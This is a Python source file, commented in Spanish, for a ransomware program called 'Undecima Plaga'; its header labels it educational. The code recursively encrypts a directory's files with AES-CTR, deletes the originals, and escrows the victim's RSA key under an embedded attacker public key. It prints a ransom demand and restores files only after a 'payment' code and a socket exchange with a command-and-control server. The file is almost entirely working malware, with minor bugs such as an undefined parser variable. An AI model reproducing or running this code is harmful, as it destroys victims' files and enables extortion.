#!/usr/bin/env python3
"""
=========================================================
  UNDECIMA PLAGA — Ransomware
=========================================================
  PROPOSITO EDUCATIVO - ENTORNO CONTROLADO

  Modos de uso:
    # Cifrar archivos (ataque):
    python3 ransomware.py --ataque --directorio /ruta/victima

    # Recuperar archivos (tras el pago):
    python3 ransomware.py --recuperacion --directorio /ruta/victima --ip 127.0.0.1 -p 9999
=========================================================
"""

import os
import sys
import glob
import zipfile
import socket
import argparse

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

#  LLAVE PUBLICA PERMANENTE
LLAVE_PUBLICA_PERMANENTE = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwPRiqpkmhj6I7ai/c+zQ
HzMX+7/m3Zc1CiCTGuYu0lyd8UFYOCLE6yJNneogvb2F5rLCeKc+Vv2WuxGpMZId
81CeY2+1xcQ2XZ30pJofcGGhX72yDT/9/qXFmuTo2Sx/Q3d2wtnqKXP/Te61hnXv
YDW9XIhT+beVUDNqfy/Z/WSwT4pW/c3ph3UnSUvFj3EVQPh4JwZyRQONz3Mm+x9g
m8y28/oTKOVXuemBfZCk/wAwtiY/lQrkxRtmb4JdxETMKxplj9JIpNvdkh1mZ9JV
z7bR1VA/7N40kjkEOtRZOjiRlBes3+vgEakxCVBzuSRDg3LCNKAGCJbZoQRzNXdq
QwIDAQAB
-----END PUBLIC KEY-----"""

TAM_SEGMENTO_RSA = 190    # maximo bytes por segmento para RSA-OAEP con SHA256 y RSA-2048
CHUNK_SIZE       = 1024   # tamaño de bloque para lectura de archivos

#  FUNCIONES DE LLAVES
def generar_privada():
    """Genera el par de llaves RSA unicas para la victima."""
    return rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )

def generar_publica(privada):
    return privada.public_key()

def convertir_llave_privada_bytes(llave_privada):
    return llave_privada.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    )

def convertir_bytes_llave_privada(contenido_binario):
    return serialization.load_pem_private_key(
        contenido_binario,
        backend=default_backend(),
        password=None
    )

#  PROTOCOLO DE SOCKET (Griss)
def _recibir_exacto(sock, n):
    datos = b''
    while len(datos) < n:
        chunk = sock.recv(n - len(datos))
        if not chunk:
            raise ConnectionError("Conexión cerrada")
        datos += chunk
    return datos

def enviar_bytes(sock, data: bytes):
    longitud = len(data).to_bytes(4, 'big')
    sock.sendall(longitud + data)

def recibir_bytes(sock) -> bytes:
    longitud = int.from_bytes(_recibir_exacto(sock, 4), 'big')
    return _recibir_exacto(sock, longitud)

#  SEGMENTACION Y EMPAQUETADO (Griss)
def segmentar_llave(llave_privada_local):
    """Divide los bytes de la llave privada local en bloques de 190 bytes."""
    segmentos = [llave_privada_local[i:i + TAM_SEGMENTO_RSA]
                 for i in range(0, len(llave_privada_local), TAM_SEGMENTO_RSA)]
    return segmentos

def cifrar_segmentos(segmentos_llave):
    """
    Cifra cada segmento de la llave_privada_local con RSA-OAEP
    usando la llave_publica_permanente.
    """
    llave_publica_permanente = serialization.load_pem_public_key(
        LLAVE_PUBLICA_PERMANENTE,
        backend=default_backend()
    )
    segmentos_cifrados = []
    for pedazo in segmentos_llave:
        cifrado = llave_publica_permanente.encrypt(
            pedazo,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        segmentos_cifrados.append(cifrado)
    return segmentos_cifrados

def crear_paquete_llave(segmentos_cifrados, nombre_zip="llave_local_protegida.zip"):
    """
    Toma la lista de segmentos cifrados con la llave_publica_permanente,
    los guarda temporalmente y los mete en un archivo .zip.
    """
    with zipfile.ZipFile(nombre_zip, 'w') as archivo_zip:
        for i, segmento in enumerate(segmentos_cifrados):
            nombre_segmento = f"seg{i}.bin"
            with open(nombre_segmento, 'wb') as f:
                f.write(segmento)
            archivo_zip.write(nombre_segmento)
            os.remove(nombre_segmento)
    print(f"[+] Archivo {nombre_zip} creado con exito.")

def enviar_paquete_zip(sock, nombre_zip="llave_local_protegida.zip"):
    """Lee el archivo .zip y lo envia completo al servidor CC."""
    with open(nombre_zip, 'rb') as f:
        contenido_zip = f.read()
    enviar_bytes(sock, contenido_zip)
    print(f"[+] Paquete {nombre_zip} enviado con exito al servidor CC.")

#  CIFRADO DE ARCHIVOS AES-CTR recursivo con glob (Abraham)
def cifrar_archivos(directorio, llave_publica_local):
    """
    Cifra todos los archivos del directorio de forma recursiva con AES-CTR.
    Estructura: [IV 16B] + [LLAVE_AES_CIFRADA 256B] + [CONTENIDO_CIFRADO]

    Por cada archivo:
      1. Genera una llave AES-128 y un IV unicos
      2. Cifra la llave AES con RSA-OAEP (llave publica local)
      3. Escribe en cabecera: [IV 16B] + [LLAVE_AES_CIFRADA 256B]
      4. Cifra el contenido con AES-CTR en bloques de CHUNK_SIZE
      5. Elimina el archivo original y renombra con extension .locked
    """
    archivos = []
    for ruta in glob.glob(os.path.join(directorio, '**'), recursive=True):
        if os.path.isfile(ruta):
            archivos.append(ruta)

    if not archivos:
        print(f"[!] No se encontraron archivos en: {directorio}")
        sys.exit(1)

    print(f"[+] Cifrando {len(archivos)} archivo(s)...")
    for ruta in archivos:
        llave_aes = os.urandom(16)
        iv = os.urandom(16)

        # Cifrar llave AES con llave publica local (RSA-OAEP)
        llave_aes_cifrada = llave_publica_local.encrypt(
            llave_aes,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        # Cifrar contenido en bloques y escribir en archivo .locked
        cipher = Cipher(algorithms.AES(llave_aes), modes.CTR(iv), backend=default_backend())
        encryptor = cipher.encryptor()

        ruta_cifrada = ruta + ".cifrado"
        with open(ruta, 'rb') as f_entrada:
            with open(ruta_cifrada, 'wb') as f_salida:
                # Cabecera: IV + LLAVE_AES_CIFRADA
                f_salida.write(iv)
                f_salida.write(llave_aes_cifrada)
                # Contenido cifrado en bloques
                while True:
                    chunk = f_entrada.read(CHUNK_SIZE)
                    if not chunk:
                        break
                    f_salida.write(encryptor.update(chunk))
                f_salida.write(encryptor.finalize())

        os.remove(ruta)
        print(f"[+] Cifrado: {os.path.basename(ruta_cifrada)}")
    print(f"[+] {len(archivos)} archivo(s) cifrados.")


#  DESCIFRADO DE ARCHIVOS AES-CTR recursivo con glob (Abraham)
def descifrar_archivos(directorio, llave_privada_local):
    """
    Descifra todos los archivos .locked del directorio de forma recursiva.
    Estructura: [IV 16B] + [LLAVE_AES_CIFRADA 256B] + [CONTENIDO_CIFRADO]

    Por cada archivo:
      1. Lee la cabecera: IV (16B) y LLAVE_AES_CIFRADA (256B)
      2. Descifra la llave AES con RSA-OAEP (llave privada local)
      3. Descifra el contenido con AES-CTR en bloques de CHUNK_SIZE
      4. Restaura el archivo original y elimina el .locked
    """
    archivos = []
    for ruta in glob.glob(os.path.join(directorio, '**', '*.cifrado'), recursive=True):
        if os.path.isfile(ruta):
            archivos.append(ruta)

    if not archivos:
        print(f"[!] No se encontraron archivos .locked en: {directorio}")
        return

    print(f"[+] Descifrando {len(archivos)} archivo(s)...")
    for ruta in archivos:
        ruta_original = ruta.removesuffix(".cifrado")

        with open(ruta, 'rb') as f_entrada: 
            with open(ruta_original, 'wb') as f_salida:
                # Leer cabecera: IV (16B) + LLAVE_AES_CIFRADA (256B)
                iv = f_entrada.read(16)
                llave_aes_cifrada = f_entrada.read(256)

                # Descifrar llave AES con llave privada local (RSA-OAEP)
                llave_aes = llave_privada_local.decrypt(
                    llave_aes_cifrada,
                    padding.OAEP(
                        mgf=padding.MGF1(algorithm=hashes.SHA256()),
                        algorithm=hashes.SHA256(),
                        label=None
                    )
                )

                # Descifrar contenido en bloques
                cipher = Cipher(algorithms.AES(llave_aes), modes.CTR(iv), backend=default_backend())
                decryptor = cipher.decryptor()

                while True:
                    chunk = f_entrada.read(CHUNK_SIZE)
                    if not chunk:
                        break
                    f_salida.write(decryptor.update(chunk))
                f_salida.write(decryptor.finalize())

        os.remove(ruta)
        print(f"[+] Descifrado: {os.path.basename(ruta_original)}")
    print(f"[+] {len(archivos)} archivo(s) restaurados.")


#  ATAQUE
def ataque(directorio):
    """
    FASES:
    1. Genera llaves RSA locales (publica y privada)
    2. Segmenta y cifra la llave privada local con la llave publica permanente
    3. Empaqueta los segmentos en un ZIP
    4. Elimina la llave privada local de memoria
    5. Cifra los archivos del directorio con AES-CTR
    """
    print("======================== INICIANDO FASE DE ATAQUE ========================")

    # Paso 1: generar llaves locales
    privada_local = generar_privada()
    publica_local = generar_publica(privada_local)
    privada_pem = convertir_llave_privada_bytes(privada_local)

    # Paso 2: segmentar y cifrar la llave privada local
    segmentos_planos = segmentar_llave(privada_pem)
    segmentos_cifrados = cifrar_segmentos(segmentos_planos)

    # Paso 3: empaquetar segmentos en ZIP
    crear_paquete_llave(segmentos_cifrados, "llave_local_protegida.zip")

    # Paso 4: eliminar llave privada local de memoria
    del privada_local
    del privada_pem
    print("[+] Llave privada local protegida y eliminada de memoria.")

    # Paso 5: cifrar archivos del directorio (recursivo)
    cifrar_archivos(directorio, publica_local)

    print("\n" + "="*60)
    print("  *** Como castigo por tus pecados digitales, la undecima plaga ha caido sobre ti *** ")
    print("="*60)
    print("  [!] TODOS TUS ARCHIVOS HAN SIDO CIFRADOS")
    print("  [!] Para recuperarlos debes realizar un pago por rescate.")
    print("="*60)
    print("  Una vez realizado el pago ejecuta:")
    print("  python3 ransomware.py --recuperacion --directorio <dir>")
    print("                        --ip <ip_servidor> -p <puerto>")
    print("="*60 + "\n")


# RECUPERACION
def recuperacion(directorio, ip_servidor, puerto_servidor):
    """
    FASES:
    1. Confirma el pago con la victima (codigo de liberacion)
    2. Envia el ZIP con los segmentos cifrados al servidor CC
    3. Recibe la llave privada local descifrada y unida por el CC
    4. Descifra los archivos del directorio
    """
    print("======================== INICIANDO FASE DE RECUPERACION ========================")

    # Paso 1: confirmar pago
    confirmacion = input("Ingrese el codigo de liberacion: ")
    if confirmacion.lower() != "pagado":
        print("[!] Pago no verificado. Saliendo...")
        return

    try:
        # Paso 2: conectar al CC y enviar el ZIP
        print(f"[+] Conectando al Servidor CC en {ip_servidor}:{puerto_servidor}...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip_servidor, int(puerto_servidor)))

        nombre_zip = "llave_local_protegida.zip"
        if not os.path.exists(nombre_zip):
            print("[!] No se encontro el paquete de llaves. No se puede recuperar.")
            return

        print(f"[+] Enviando {nombre_zip} para su descifrado...")
        enviar_paquete_zip(sock, nombre_zip)

        # Paso 3: recibir llave privada local descifrada
        print("[+] Esperando la llave de liberacion desde el servidor...")
        llave_privada_pem = recibir_bytes(sock)
        sock.close()

        llave_privada_local = convertir_bytes_llave_privada(llave_privada_pem)
        print("[+] Llave de liberacion recibida y procesada con exito.")

        # Paso 4: descifrar archivos (recursivo)
        print(f"[+] Restaurando archivos en: {directorio}...")
        descifrar_archivos(directorio, llave_privada_local)

        # Limpiar ZIP
        if os.path.exists(nombre_zip):
            os.remove(nombre_zip)

        # Paso 5: mensaje de recuperacion
        print("\n" + "="*60)
        print("  [OK] TODOS TUS ARCHIVOS HAN SIDO RECUPERADOS")
        print("  Gracias por su preferencia.")
        print("  Estamos mejorando el servicio para futuros reencuentros.")
        print("="*60 + "\n")

    except Exception as e:
        print(f"[!] Error durante la recuperacion: {e}")

if __name__ == "__main__":
    all_args = argparse.ArgumentParser()
    modo = all_args.add_mutually_exclusive_group(required=True) # Modo de operacion (mutuamente excluyentes)
    modo.add_argument("--ataque", action="store_true", help="Cifra los archivos del directorio")
    modo.add_argument("--recuperacion", action="store_true", help="Descifra los archivos tras el pago")
    # Argumentos
    parser.add_argument("-d", "--directorio", required=True, help="Directorio donde se realizara el ataque/recuperacion")
    parser.add_argument("--ip", help="IP del servidor CC")
    parser.add_argument("-p", "--puerto", type=int, help="Puerto del servidor CC")

    args = parser.parse_args()

    # Validar directorio
    if not os.path.isdir(args.directorio):
        print(f"[!] El directorio no existe: {args.directorio}")
        sys.exit(1)

    if args.ataque:
        ataque(args.directorio)
    elif args.recuperacion:
        if not args.ip:
            print("[!] Debes especificar la IP del servidor CC con --ip")
            sys.exit(1)
        recuperacion(args.directorio, args.ip, args.puerto)